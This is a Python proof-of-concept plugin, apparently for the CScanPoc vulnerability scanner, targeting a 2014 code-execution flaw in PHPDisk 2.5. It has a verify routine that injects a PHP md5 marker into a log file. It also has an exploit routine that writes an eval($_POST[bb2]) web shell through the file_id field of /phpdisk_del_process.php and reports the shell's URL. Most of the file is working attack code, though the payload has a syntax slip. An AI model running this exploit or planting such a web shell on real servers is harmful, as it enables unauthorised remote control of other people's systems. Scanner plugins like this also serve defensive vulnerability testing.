# coding: utf-8
import re
import urllib.request
import urllib.parse
import urllib.error
import urllib.request
import urllib.error
import urllib.parse

from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType


class Vuln(ABVuln):
    vuln_id = 'PHPDisk_0101'  # 平台漏洞编号，留空
    name = 'PHPDisk 2.5 /phpdisk_del_process.php 代码执行'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.RCE  # 漏洞类型
    disclosure_date = '2014-10-20'  # 漏洞公布时间
    desc = '''
    PHPDisk是一套采用PHP和MySQL构建的网络硬盘(文件存储管理)系统，可替代传统的FTP文件管理。友好的界面，操作的便捷深受用户的欢迎。是一套可用于网络上文件办公、共享、传递、查看的多用户文件存储系统。广泛应用于互联网、公司、网吧、学校等地管理及使用文件，多方式的共享权限，全方位的后台管理，满足从个人到企业各方面应用的需求。
    PHPDisk 2.5 /phpdisk_del_process.php 代码执行。
    利用环境比较鸡肋，代码执行需要关闭short_open_tag。
    '''  # 漏洞描述
    ref = 'https://bugs.shuimugan.com/bug/view?bug_no=057665'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'PHPDisk'  # 漏洞应用名称
    product_version = '2.5'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '68495b94-5bf1-4125-80b1-e52ee6cda227'  # 平台 POC 编号，留空
    author = 'hyhmnn'  # POC编写者
    create_date = '2018-05-29'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            del_url = self.target + '/phpdisk_del_process.php?a'
            shell_url = self.target + '/system/delfile_log.php'
            data = {
                'pp': 'system/install.lock',
                'file_id': '<?php echo md5(233333);?>#',
                'safe': 'a'
            }
            post_data = urllib.parse.urlencode(data)
            request = urllib.request.Request(del_url, post_data)
            response = urllib.request.urlopen(request)
            shell_request = urllib.request.Request(shell_url)
            shell_response = urllib.request.urlopen(shell_request)
            content = str(response.read())
            match = re.search('fb0b32aeafac4591c7ae6d5e58308344', content)
            if match:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))
        except Exception as e:
            self.output.info('执行异常：{}'.format(e))

    def exploit(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 漏洞利用'.format(
                target=self.target, vuln=self.vuln))
            del_url = self.target + '/phpdisk_del_process.php?a'
            shell_url = self.target + '/system/delfile_log.php'
            data = {
                'pp': 'system/install.lock',
                'file_id': '<?php echo md5(233333);eval($_POST[bb2];?>#',
                'safe': 'a'
            }
            post_data = urllib.parse.urlencode(data)
            request = urllib.request.Request(del_url, post_data)
            response = urllib.request.urlopen(request)
            shell_request = urllib.request.Request(shell_url)
            shell_response = urllib.request.urlopen(shell_request)
            content = str(response.read())
            match = re.search('fb0b32aeafac4591c7ae6d5e58308344', content)
            if match:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞；获取的信息：webshell={webshell},content=\'<?php echo md5(233333);eval($_POST[bb2];?>\''.format(
                    target=self.target, name=self.vuln.name, webshell=shell_url))
        except Exception as e:
            self.output.info('执行异常：{}'.format(e))


if __name__ == '__main__':
    Poc().run()
